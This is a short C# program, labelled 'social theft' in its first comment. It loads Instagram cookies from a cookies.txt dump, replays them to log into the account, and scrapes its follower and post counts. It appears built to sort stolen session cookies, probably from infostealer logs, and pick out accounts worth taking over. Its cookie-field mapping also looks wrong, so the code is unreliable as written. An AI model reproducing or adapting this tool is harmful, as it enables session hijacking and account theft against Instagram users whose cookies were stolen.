// social theft
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

namespace InstagramLogin
{
    class Program
    {
        static async Task Main(string[] args)
        {
            // Load cookies from file and filter out Instagram cookies
            List<string> cookies = await LoadCookiesFromFile("cookies.txt");
            List<string> instagramCookies = cookies.Where(cookie => cookie.Contains(".instagram.com")).ToList();

            // Login to Instagram using the filtered cookies
            HttpClientHandler handler = new HttpClientHandler();
            handler.CookieContainer = new System.Net.CookieContainer();
            foreach (string cookie in instagramCookies)
            {
                string[] cookieParts = cookie.Split('\t');
                handler.CookieContainer.Add(new System.Net.Cookie(cookieParts[0], cookieParts[6], cookieParts[2], cookieParts[3]));
            }
            HttpClient client = new HttpClient(handler);
            HttpResponseMessage response = await client.GetAsync("https://www.instagram.com/");
            string responseBody = await response.Content.ReadAsStringAsync();

            // Extract follower count from response body
            int followerCount = int.Parse(responseBody.Split(new[] { "\"edge_followed_by\":{\"count\":" }, StringSplitOptions.None)[1].Split('}')[0]);
            Console.WriteLine("Follower count: " + followerCount);

            // Extract post count from response body
            int postCount = int.Parse(responseBody.Split(new[] { "\"edge_owner_to_timeline_media\":{\"count\":" }, StringSplitOptions.None)[1].Split('}')[0]);
            Console.WriteLine("Post count: " + postCount);
        }

        static async Task<List<string>> LoadCookiesFromFile(string filename)
        {
            List<string> cookies = new List<string>();
            using (StreamReader reader = new StreamReader(filename))
            {
                while (!reader.EndOfStream)
                {
                    string line = await reader.ReadLineAsync();
                    if (line.Contains(".instagram.com"))
                    {
                        cookies.Add(line);
                    }
                }
            }
            return cookies;
        }
    }
}